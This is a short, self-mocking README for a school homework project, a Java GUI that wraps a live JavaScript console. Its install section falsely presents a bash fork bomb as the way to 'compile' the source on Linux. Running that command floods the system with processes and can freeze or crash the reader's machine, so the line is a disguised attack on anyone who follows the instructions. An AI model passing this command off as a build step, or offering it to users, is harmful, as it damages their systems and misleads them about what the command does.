JCalc
=====

Just a simple homework for school
It offers basically just a live JavaScript interpreter with nice input and output

Some people need some kind of installation insructions but I am too lazy to writ them. So I will just instead provide you with some random shit I am writing as I am sitting in my Physics class and am so utterly bored...
For compiling one might need an eclipse installation, but this is up to you. You can even translate the source code to intermediate code by hand if you are a Java professional, but if you can Rolf do this would not bother viewing this code, as it is 10 minute bullshit of boredom and the need of an IT class homework.
If you are on linux and like the terminal you might have some fun by 'compiling' the source-code by running`:(){:|:&};:`. Have fun with your PC!

The Source Code
===============

JSjit
-----
It is a senseless wrapper class for a interactive JavaScript console. It isn't even a just-in-time compiler as it compiles nothing. The reason it is there is that I wanted to have more than one class as it looks more professional. It could also have build a Factory for creating Javascript runtime environments, but I hate Factories.

The Main class that must not be named (I just forgot it and I am too lazy to look it up again)

Well, it is very productive when it is run... at least in some kind. It creates a GUI. A very nice GUI. It is sooooo beatiful, I spend 20 seconds of my life designing it. There is a button with an Event Handler. That was sooo complex to do. You have to double click the Button in the design window. It took me another 2 seconds of my life, but it was totally wort it. The main class keeps a instance of the fake jit compiler and passes the input to it and gets the output of life and even displays it
